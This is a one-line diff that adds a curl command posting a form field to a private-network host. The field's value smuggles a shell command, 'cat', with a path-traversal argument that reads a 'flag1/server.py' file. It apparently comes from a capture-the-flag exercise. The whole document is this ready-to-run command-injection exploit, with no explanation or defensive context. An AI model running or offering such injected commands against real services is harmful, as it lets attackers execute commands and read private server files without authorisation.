@@ -1,0 +1,1 @@
+curl -X POST -H 'Content-Type: application/x-www-form-urlencoded; charset=utf-8' -d "file=cat ../../../flag1/server.py;" 10.200.33.61:1624
